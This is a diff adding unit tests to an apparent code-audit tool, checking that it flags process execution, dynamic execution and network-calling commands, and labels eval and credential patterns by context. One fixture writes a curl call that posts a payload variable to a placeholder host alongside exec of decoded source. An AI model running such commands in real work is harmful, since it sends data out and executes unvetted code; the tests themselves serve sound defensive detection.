@@ -37,6 +37,40 @@ class AuditSkillTests(unittest.TestCase):
             rules = {finding["rule"] for finding in findings}
             self.assertTrue({"destructive_command", "external_write", "prompt_injection", "hidden_promotion"} <= rules)
 
+    def test_process_dynamic_execution_and_command_transfer_are_visible(self) -> None:
+        with tempfile.TemporaryDirectory() as raw:
+            root = Path(raw)
+            script = root / "runner.py"
+            script.write_text(
+                'subprocess.run(["curl", "https://example.invalid", "--data", payload])\n'
+                'exec(decoded_source)\n',
+                encoding="utf-8",
+            )
+            findings = audit(root)["findings"]
+            rules = {finding["rule"] for finding in findings}
+            self.assertTrue({"process_execution", "dynamic_execution", "command_network_access"} <= rules)
+            self.assertTrue(all(finding["context"] == "executable_code" for finding in findings))
+            self.assertTrue(all(finding["requires_human_review"] for finding in findings))
+
+    def test_documentation_test_fixture_and_detector_definition_are_labeled(self) -> None:
+        with tempfile.TemporaryDirectory() as raw:
+            root = Path(raw)
+            scripts = root / "scripts"
+            scripts.mkdir()
+            (root / "README.md").write_text("Never eval(user_input).\n", encoding="utf-8")
+            (scripts / "test_sample.py").write_text("eval(test_fixture)\n", encoding="utf-8")
+            (scripts / "audit_skill.py").write_text(
+                'RULES = (("credential", re.compile(r"password")),)\n',
+                encoding="utf-8",
+            )
+
+            findings = audit(root)["findings"]
+            contexts = {finding["path"]: finding["context"] for finding in findings}
+            self.assertEqual(contexts["README.md"], "documentation")
+            self.assertEqual(contexts["scripts/test_sample.py"], "test_fixture")
+            self.assertEqual(contexts["scripts/audit_skill.py"], "detector_definition")
+            self.assertTrue(all(not finding["requires_human_review"] for finding in findings))
+
     def test_symlink_target_is_not_read(self) -> None:
         with tempfile.TemporaryDirectory() as temp:
             base = Path(temp)
